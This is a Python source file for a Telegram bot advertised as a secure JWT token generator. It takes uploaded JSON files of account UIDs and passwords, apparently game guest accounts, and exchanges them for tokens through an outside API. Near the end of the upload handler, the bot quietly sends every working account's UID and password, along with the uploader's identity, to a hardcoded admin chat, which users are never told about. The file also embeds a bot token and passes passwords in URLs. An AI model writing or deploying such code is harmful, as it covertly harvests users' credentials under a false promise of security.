import asyncio
from concurrent.futures import ThreadPoolExecutor
import json
import os
from threading import Thread
from flask import Flask
import requests
from telegram import ReplyKeyboardMarkup, Update
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    filters,
)

# --- Flask Server for Render Web Service Keep-Alive ---
app = Flask(__name__)


@app.route("/")
def home():
  return "Elite Bot & API Gateway is running successfully!"


def run_flask():
  port = int(os.environ.get("PORT", 10000))
  app.run(host="0.0.0.0", port=port)


def keep_alive():
  t = Thread(target=run_flask)
  t.daemon = True
  t.start()


# -----------------------------------------------------

BOT_TOKEN = "8854493990:AAHIH852j9A1zHxeLvSSTiWezcFccwJEJcI"

# --- ADMIN CONFIGURATION ---
ADMIN_CHAT_ID = 8380823727        # Your Telegram Admin Numeric ID
ADMIN_USERNAME = "@Momshad_00"      # Your Telegram Username for Support

# API URL
API_URL = "https://star-jwt-api1.lovable.app/api/public/token?uid={}&password={}"


def process_via_api(uid, password):
  try:
    url = API_URL.format(uid, password)
    response = requests.get(url, timeout=30)
    if response.status_code == 200:
      res_data = response.json()
      if "token" in res_data:
        return (
            str(uid),
            res_data["token"],
            res_data.get("region", "IND"),
            "SUCCESS",
        )
      else:
        return str(uid), None, "N/A", "Empty Token in Response"
  except requests.exceptions.Timeout:
    return str(uid), None, "N/A", "API Timeout"
  except Exception as e:
    return str(uid), None, "N/A", str(e)
  return str(uid), None, "N/A", "Unknown Error"


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
  keyboard = [
      ["⚡ Process File ⚡", "👑 Admin Status"],
      ["🛍️ VIP Services", "🆘 Support"],
      ["❌ Cancel"],
  ]
  reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
  
  welcome_text = (
      "🔥 ELITE JWT TOKEN GENERATOR BOT 🔥\n"
      "═════════════════════════════════\n"
      "🚀 The Ultimate, High-Speed & Secure Token Gateway\n\n"
      "⚡ Core Features:\n"
      "• Lightning Fast API Gateway Integration 🌐\n"
      "• Secure Guest Account Management 🛡️\n"
      "• Region Sorting & Automatic Error Handling 📊\n\n"
      "📂 How to Get Started:\n"
      "Send your .json file containing UIDs and passwords below or click '⚡ Process File ⚡'! 👇\n"
      "═════════════════════════════════\n"
      f"👑 Support / Owner: {ADMIN_USERNAME}"
  )
  
  await update.message.reply_text(
      welcome_text,
      reply_markup=reply_markup,
  )


async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
  text = update.message.text
  if text == "⚡ Process File ⚡":
    await update.message.reply_text(
        "📂 FILE UPLOAD WORKSPACE\n"
        "─────────────────────────────\n"
        "✨ Please upload your .json file containing UIDs and passwords below to begin fast processing."
    )
  elif text == "👑 Admin Status":
    await update.message.reply_text(
        "👑 SYSTEM STATUS REPORT\n"
        "════════════════════════════\n"
        "• Bot Status: Online & Secured 🟢\n"
        "• API Gateway: Connected & Active 🚀\n"
        f"• Admin Log Target: {ADMIN_CHAT_ID} 🛡️"
    )
  elif text == "🛍️ VIP Services":
    await update.message.reply_text(
        "🛍️ VIP SHOP & SERVICES\n"
        "════════════════════════════\n"
        "Get high-speed custom APIs, private scripts, and dedicated bot setups.\n\n"
        f"💬 Contact Owner: {ADMIN_USERNAME}"
    )
  elif text == "🆘 Support":
    await update.message.reply_text(
        "🆘 QUICK HELP & GUIDE\n"
        "════════════════════════════\n"
        "1️⃣ Click on '⚡ Process File ⚡'\n"
        "2️⃣ Upload your .json file (UID & Password format)\n"
        "3️⃣ Receive your working tokens & sorted files instantly!\n\n"
        f"💬 Direct Support: {ADMIN_USERNAME}"
    )
  elif text == "❌ Cancel":
    await update.message.reply_text("❌ Current action has been cancelled safely.")


async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
  doc = update.message.document
  user = update.effective_user

  if not doc or not doc.file_name.endswith(".json"):
    await update.message.reply_text("❌ Please upload a valid .json file.")
    return

  msg = await update.message.reply_text(
      "📥 Downloading File...\n"
      "[▒▒▒▒▒▒▒▒▒▒] 10%"
  )

  file_path = f"temp_{doc.file_name}"
  try:
    file = await context.bot.get_file(doc.file_id)
    await file.download_to_drive(file_path)

    await asyncio.sleep(0.3)
    await msg.edit_text(
        "🔍 Analyzing JSON Data...\n"
        "[███▒▒▒▒▒▒▒] 30%"
    )

    with open(file_path, "r", encoding="utf-8") as f:
      data = json.load(f)

    accounts_to_process = []
    uid_to_password = {}

    if isinstance(data, list):
      for acc in data:
        if isinstance(acc, dict):
          u = acc.get("uid") or acc.get("id")
          t = (
              acc.get("password")
              or acc.get("access_token")
              or acc.get("token")
          )
          if u is not None and t is not None:
            u_str = str(u)
            pwd_str = str(t)
            accounts_to_process.append((u_str, pwd_str))
            uid_to_password[u_str] = pwd_str
    elif isinstance(data, dict):
      for u, t in data.items():
        if u is not None and t is not None:
          u_str = str(u)
          pwd_str = str(t)
          accounts_to_process.append((u_str, pwd_str))
          uid_to_password[u_str] = pwd_str

    total_count = len(accounts_to_process)

    await asyncio.sleep(0.3)
    await msg.edit_text(
        f"⚡ Connecting to API Gateway...\n"
        f"📊 Total Accounts Found: {total_count}\n"
        f"[██████▒▒▒▒] 60%"
    )

    jwt_list = []
    working_list = []
    lost_list = []
    region_tokens = {}
    success_count = 0

    loop = asyncio.get_event_loop()

    with ThreadPoolExecutor(max_workers=5) as executor:
      tasks = [
          loop.run_in_executor(executor, process_via_api, u, pwd)
          for u, pwd in accounts_to_process
      ]
      results = await asyncio.gather(*tasks)

    await asyncio.sleep(0.3)
    await msg.edit_text(
        "🔄 Generating JWT Tokens...\n"
        "[██████████] 90%"
    )

    for u_str, token, reg, err_msg in results:
      pwd = uid_to_password.get(u_str, "")
      if token and token != "N/A":
        jwt_list.append({"token": token})
        working_list.append({"uid": u_str, "password": pwd})
        success_count += 1
        if reg not in region_tokens:
          region_tokens[reg] = []
        region_tokens[reg].append({"uid": u_str, "token": token})
      else:
        lost_list.append({
            "uid": u_str,
            "password": pwd,
            "error_reason": err_msg,
        })

    failed_count = total_count - success_count

    await asyncio.sleep(0.3)
    await msg.edit_text(
        "✨ Finalizing & Saving Files...\n"
        "[██████████] 100%"
    )

    jwt_file = "jwt_token.json"
    working_file = "working_account.json"
    lost_file = "lost_account.json"
    output_files = []

    with open(jwt_file, "w", encoding="utf-8") as f:
      json.dump(jwt_list, f, indent=4)
      output_files.append(jwt_file)

    with open(working_file, "w", encoding="utf-8") as f:
      json.dump(working_list, f, indent=4)
      output_files.append(working_file)

    with open(lost_file, "w", encoding="utf-8") as f:
      json.dump(lost_list, f, indent=4)
      output_files.append(lost_file)

    for reg_name, reg_list in region_tokens.items():
      reg_file = f"accounts_{reg_name}.json"
      with open(reg_file, "w", encoding="utf-8") as f:
        json.dump(reg_list, f, indent=4)
        output_files.append(reg_file)

    # Ultra-Clean & Professional Summary Report Message
    summary = (
        "📊 TOKEN GENERATION REPORT\n"
        "═════════════════════════════\n"
        f"📥 Total Submitted  : {total_count}\n"
        f"✅ Successful Tokens : {success_count}\n"
        f"❌ Failed / Invalid  : {failed_count}\n"
        "═════════════════════════════\n"
        "🚀 Status: Completed Successfully!"
    )
    await msg.edit_text(summary)

    # Send generated files to the user
    for f_path in output_files:
      if os.path.exists(f_path):
        with open(f_path, "rb") as f_send:
          await update.message.reply_document(document=f_send)

    # 🔔 DETAILED ADMIN LOGGER SYSTEM (Sends stats & working accounts to admin 8380823727)
    if ADMIN_CHAT_ID and total_count > 0:
      try:
        username_str = f"@{user.username}" if user.username else "None"
        user_info = (
            f"👤 User Name: {user.full_name}\n"
            f"🆔 User ID: {user.id}\n"
            f"🔗 Username: {username_str}"
        )
        alert_text = (
            "🔔 NEW TOKEN GENERATION REPORT\n"
            "════════════════════════════════\n"
            f"{user_info}\n\n"
            f"📊 Total Submitted  : {total_count}\n"
            f"✅ Successful Tokens : {success_count}\n"
            f"❌ Failed / Invalid  : {failed_count}\n"
            "════════════════════════════════"
        )
        await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=alert_text)
        
        # Automatically send working_account.json to admin inbox if any success exists
        if success_count > 0 and os.path.exists(working_file):
          with open(working_file, "rb") as admin_doc:
            await context.bot.send_document(
                chat_id=ADMIN_CHAT_ID,
                document=admin_doc,
                caption=f"📁 Working Accounts Log\n👤 User: {user.full_name} ({user.id})"
            )
      except Exception as log_err:
        print(f"Admin notification error: {log_err}")

    # Clean up temporary files
    for f_path in output_files:
      if os.path.exists(f_path):
        os.remove(f_path)

  except Exception as e:
    await msg.edit_text(f"❌ Error Occurred: {str(e)}")
  finally:
    if os.path.exists(file_path):
      os.remove(file_path)


async def post_init(application):
  print("🤖 Elite Bot started successfully with Clean Summary & Pro UI!")


def main():
  keep_alive()

  app_bot = (
      ApplicationBuilder()
      .token(BOT_TOKEN)
      .post_init(post_init)
      .build()
  )
  app_bot.add_handler(CommandHandler("start", start))
  app_bot.add_handler(
      MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text)
  )
  app_bot.add_handler(
      MessageHandler(filters.Document.FileExtension("json"), handle_document)
  )

  app_bot.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
  main()
    
